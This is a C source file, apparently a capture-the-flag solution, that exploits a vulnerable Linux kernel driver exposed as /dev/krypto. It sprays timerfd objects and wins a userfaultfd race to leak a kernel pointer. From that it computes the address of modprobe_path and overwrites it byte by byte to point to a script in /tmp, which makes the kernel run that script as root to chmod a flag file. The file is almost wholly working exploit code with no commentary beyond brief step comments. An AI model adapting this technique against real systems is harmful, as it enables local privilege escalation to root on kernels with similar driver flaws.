#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define KRYPTO_RNG_CMD 0x1337
#define PAGE_SIZE 0x1000

typedef struct request {
    unsigned char *buf;
    size_t buf_len;
} req_t;

unsigned long *leak;
unsigned long leak_size = 0x1000;

int create_timer();
void RegisterUserfault(void *fault_page, void *handler);
void *userfaultfd_handler(void *arg);
void ErrExit(char *err_msg);

int main(int argc, char const *argv[]) {
    int fd = open("/dev/krypto", O_RDONLY);

    if (fd == -1) {
        printf("error opening /dev/krypto... abort");
        exit(1);
    }

    system("echo '#!/bin/sh\nchmod 777 /home/vagrant/flag\n' > /tmp/a");
    system("chmod +x /tmp/a");
    system("touch /tmp/dummy");
    system("chmod +x /tmp/dummy");
    system("echo -n '\xff\xff\xff\xff' > /tmp/dummy");
    /* */

    // STEP 1 : leak modprobe_path
    // Spray heap with timerfd_ctx, leak function pointer
    unsigned int timers[100];
    for (int i = 0; i < 100; i++)
        timers[i] = create_timer(0);
    for (int i = 99; i >= 0; i--)
        close(timers[i]);

    void *mapped_memory_page1 = mmap((void*)0x50000, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    void *mapped_memory_page2 = mmap((void*)0x51000, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    leak = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    RegisterUserfault(mapped_memory_page1, userfaultfd_handler);

    // initial size, userfaultfd_handler() will change it to a bigger size during the race condition
    *((unsigned long *)0x51000) = 256;

    // on the border between mapped_memory_page1 and mapped_memory_page2
    ioctl(fd, KRYPTO_RNG_CMD, 0x50ff8);

    // leak[37] is timerfd_tmrproc
    unsigned long modprobe_path_leak = leak[37] + 0x133c920;

    printf("modprobe_path_leak: 0x%lx\n", modprobe_path_leak);

    // STEP 2 : overwrite modprobe_path
    req_t *req = calloc(1, sizeof(req_t));

    req->buf = (unsigned char*) modprobe_path_leak;
    req->buf_len = 1;

    // Overwrite modprobe_path with "/tmp/a" one char at a time using crypto_rng_get_bytes()
    int pos = 0;
    for (int i = 0; i < 1125; i++) {
        req->buf = (unsigned char*) (modprobe_path_leak + pos);
        if (i == 87 || i == 133 || i == 758 || i == 767 || i == 823 || i == 1021 || i == 1124)
            pos++;
        ioctl(fd, KRYPTO_RNG_CMD, req);
    }

    puts("done!");
    return 0;
}

int create_timer() {
    struct itimerspec its;

    its.it_interval.tv_sec = 0;
    its.it_interval.tv_nsec = 0;
    its.it_value.tv_sec = 10;
    its.it_value.tv_nsec = 0;

    int tfd = timerfd_create(CLOCK_REALTIME, 0);
    timerfd_settime(tfd, 0, &its, 0);

    return tfd;
}

void RegisterUserfault(void *fault_page, void *handler) {
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        ErrExit("[-] ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page;
    ur.range.len = PAGE_SIZE;
    ur.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
        ErrExit("[-] ioctl-UFFDIO_REGISTER");

    int s = pthread_create(&thr, NULL, handler, (void *)uffd);
    if (s != 0)
        ErrExit("[-] pthread_create");
}

void *userfaultfd_handler(void *arg) {
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long)arg;
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);

    if (nready != 1) {
        ErrExit("[-] Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0) {
        ErrExit("[-] msg err");
    }

    char *page = (char *)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) {
        ErrExit("[-] mmap err");
    }

    printf("[+] pagefault: 0x%llx\n", msg.arg.pagefault.address);

    struct uffdio_copy uc;

    // init page
    memset(page, 0, sizeof(page));

    uc.src = (unsigned long)page;
    uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);

    // Where to leak data
    *((unsigned long *)0x50ff8) = (unsigned long) leak; // buf

    // The memcpy inside krypto_rng() will be called with memcpy(leak, kbuf, leak_size); 
    // (initial allocation was of 256 bytes)
    *((unsigned long *)0x51000) = leak_size; // buf_len

    puts("[+] handler: done!");
    return NULL;
}

void ErrExit(char *err_msg) {
    puts(err_msg);
    exit(-1);
}
